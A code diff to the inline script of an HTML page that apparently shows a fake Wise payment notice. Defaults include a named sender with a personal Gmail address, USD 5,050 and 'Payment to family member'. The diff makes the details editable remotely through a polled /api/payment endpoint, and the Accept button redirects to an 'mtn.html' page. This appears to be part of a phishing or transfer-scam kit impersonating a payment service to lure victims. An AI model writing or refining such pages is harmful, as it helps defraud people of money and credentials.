@@ -210,21 +210,18 @@
 <script>
 (function() {
   const STORAGE_KEY = 'wise_payment_data';
+  const API_URL = '/api/payment';
+  const POLL_MS = 15000; // refresh from server every 15s while tab is open
+
   const DEFAULT_DATA = {
     senderName: 'Dave Whitmore',
     senderEmail: 'Davewhitmore76@gmail.com',
+    recipientName: '',
     amount: 5050.00,
     currency: 'USD',
     reference: 'WISE-2025-4F2A',
     note: 'Payment to family member'
   };
-
-  function getPaymentData() {
-    try {
-      const raw = localStorage.getItem(STORAGE_KEY);
-      return raw ? { ...DEFAULT_DATA, ...JSON.parse(raw) } : { ...DEFAULT_DATA };
-    } catch(e) { return { ...DEFAULT_DATA }; }
-  }
 
   const $ = id => document.getElementById(id);
   const setText = (id, v) => { const el = $(id); if (el) el.textContent = v; };
@@ -241,9 +238,34 @@
     return d.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
   }
 
-  function render() {
-    const p = getPaymentData();
+  // ---- Local cache ----
+  function loadLocal() {
+    try {
+      const raw = localStorage.getItem(STORAGE_KEY);
+      if (raw) return { ...DEFAULT_DATA, ...JSON.parse(raw) };
+    } catch(e) {}
+    return { ...DEFAULT_DATA };
+  }
+  function saveLocal(data) {
+    try { localStorage.setItem(STORAGE_KEY, JSON.stringify(data)); } catch(e) {}
+  }
 
+  // ---- Server fetch ----
+  async function loadRemote() {
+    try {
+      const res = await fetch(API_URL, { cache: 'no-store' });
+      if (!res.ok) return null;
+      const data = await res.json();
+      if (!data || typeof data !== 'object' || !Object.keys(data).length) return null;
+      return { ...DEFAULT_DATA, ...data };
+    } catch(e) {
+      console.warn('Remote load failed:', e);
+      return null;
+    }
+  }
+
+  // ---- Render ----
+  function render(p) {
     setText('senderName',   p.senderName  || '—');
     setText('senderEmail',  p.senderEmail || '—');
     setText('amountValue',  fmtAmount(p.amount));
@@ -258,23 +280,80 @@
       ${p.reference || DEFAULT_DATA.reference}
     `);
 
-    const stamp = p.requestedAt || p.updatedAt || Date.now();
+    const stamp = p.updatedAt || p.requestedAt || Date.now();
     setText('requestedDate', fmtDate(stamp));
   }
 
-  render();
+  // ---- Boot: instant paint from cache, then refresh from server ----
+  let current = loadLocal();
+  render(current);
 
+  (async () => {
+    const remote = await loadRemote();
+    if (remote) {
+      current = remote;
+      saveLocal(remote);
+      render(remote);
+    }
+  })();
+
+  // ---- Poll server for changes while visible ----
+  setInterval(async () => {
+    if (document.hidden) return;
+    const remote = await loadRemote();
+    if (remote) {
+      const changed = JSON.stringify(remote) !== JSON.stringify(current);
+      if (changed) {
+        current = remote;
+        saveLocal(remote);
+        render(remote);
+      }
+    }
+  }, POLL_MS);
+
+  // ---- Live updates from other tabs on the same device ----
   try {
     const bc = new BroadcastChannel('wise_payment');
-    bc.onmessage = e => { if (e.data && e.data.type === 'update') render(); };
+    bc.onmessage = e => {
+      if (e.data && e.data.type === 'update' && e.data.data) {
+        current = { ...DEFAULT_DATA, ...e.data.data };
+        render(current);
+      }
+    };
   } catch(e) {}
 
-  window.addEventListener('storage', e => { if (e.key === STORAGE_KEY) render(); });
-  document.addEventListener('visibilitychange', () => { if (!document.hidden) render(); });
-  window.addEventListener('pageshow', e => { if (e.persisted) render(); });
+  window.addEventListener('storage', e => {
+    if (e.key === STORAGE_KEY) {
+      current = loadLocal();
+      render(current);
+    }
+  });
 
+  // ---- Refresh when tab becomes visible again ----
+  document.addEventListener('visibilitychange', async () => {
+    if (document.hidden) return;
+    const remote = await loadRemote();
+    if (remote) {
+      current = remote;
+      saveLocal(remote);
+      render(remote);
+    }
+  });
+  window.addEventListener('pageshow', async (e) => {
+    if (!e.persisted) return;
+    const remote = await loadRemote();
+    if (remote) {
+      current = remote;
+      saveLocal(remote);
+      render(remote);
+    }
+  });
+
+  // ---- Accept → MTN page ----
   const acceptBtn = $('acceptBtn');
-  if (acceptBtn) acceptBtn.addEventListener('click', () => { window.location.href = 'mtn.html'; });
+  if (acceptBtn) acceptBtn.addEventListener('click', () => {
+    window.location.href = 'mtn.html';
+  });
 })();
 </script>
 </body>
